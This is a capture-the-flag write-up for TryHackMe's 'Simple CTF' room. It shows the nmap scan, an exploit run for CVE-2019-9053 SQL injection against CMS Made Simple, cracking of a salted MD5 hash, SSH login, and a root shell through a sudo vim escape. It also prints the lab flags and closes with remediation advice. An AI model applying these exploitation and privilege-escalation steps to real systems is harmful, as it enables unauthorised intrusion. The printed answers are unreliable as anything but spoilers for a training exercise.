# Simple CTF — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Boot2Root-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen.svg)
![OS](https://img.shields.io/badge/OS-Linux-success.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A complete penetration testing writeup for the **Simple CTF** room on TryHackMe.

---

## 📋 Executive Summary
Simple CTF assesses active network reconnaissance, exploitation of CMS Made Simple 2.2.8 via CVE-2019-9053 (time-based blind SQL injection), MD5 password hash cracking, SSH access on non-standard ports, and privilege escalation via Sudo NOPASSWD text editor abuse.

* **Target OS:** Linux (Ubuntu)
* **Initial Access:** CMS Made Simple CVE-2019-9053 SQLi -> SSH user `mitch`.
* **Privilege Escalation:** Sudo NOPASSWD on `/usr/bin/vim`.
* **Flags Recovered:**
  * `user.txt`: `G00d j0b, keep up!`
  * `root.txt`: `W3ll d0n3. You made it!`
* **Artifacts in Directory:**
  * `46635.py`: Exploit script for CVE-2019-9053
  * `hash`: Salted password hash (`0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2`)
  * `nmap.txt`: Full Nmap port scan output
  * `notes.txt`: Credentials and engagement notes

---

## 🔍 Stage 1: Reconnaissance & Enumeration

### 1.1 Port Scanning
```bash
nmap -vvv -p 21,80,2222 -sC -sV -oA nmap.txt <TARGET_IP>
```
* **Port 21/tcp:** vsftpd 3.0.3 (Anonymous FTP login allowed)
* **Port 80/tcp:** Apache httpd 2.4.18
* **Port 2222/tcp:** OpenSSH 7.2p2 Ubuntu (Non-standard SSH port)

### 1.2 Web Directory Reconnaissance
* `robots.txt` disclosed the `/simple/` directory.
* Visiting `http://<TARGET_IP>/simple/` revealed **CMS Made Simple version 2.2.8**.

---

## 💥 Stage 2: Initial Foothold (CVE-2019-9053)

### 2.1 Exploiting CMS Made Simple
The installed CMS version is vulnerable to CVE-2019-9053 (time-based blind SQL injection in the News module). We ran `46635.py`:
```bash
python 46635.py -u http://<TARGET_IP>/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```
Extracted database values:
* **Username:** `mitch`
* **Email:** `admin@admin.com`
* **Password Hash:** `0c01f4468bd75d7a84c7eb73846e8d96`
* **Salt:** `1dac0d92e9fa6bb2`

### 2.2 Password Hash Cracking
The hash follows `MD5(salt + password)`. Cracking against `rockyou.txt`:
* **Password:** `secret`

### 2.3 SSH Authentication
Connecting to SSH on port 2222:
```bash
ssh mitch@<TARGET_IP> -p 2222
# Password: secret
```
User flag:
```bash
cat user.txt
# G00d j0b, keep up!
```

---

## 📈 Stage 3: Privilege Escalation (Sudo Vim)

### 3.1 Sudo Rights Check
```bash
sudo -l
```
Output:
```text
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

### 3.2 Spawning Root Shell
Using GTFOBins Vim escape:
```bash
sudo vim -c ':!/bin/sh'
```
Root confirmation:
```bash
whoami
# root
cat /root/root.txt
# W3ll d0n3. You made it!
```

---

## 🛡️ Remediation
1. **Update CMS:** Upgrade CMS Made Simple to version >= 2.2.10.
2. **Password Hardening:** Enforce strong password complexity to defeat dictionary attacks.
3. **Sudo Least Privilege:** Do not grant unrestricted NOPASSWD sudo access to interactive text editors.
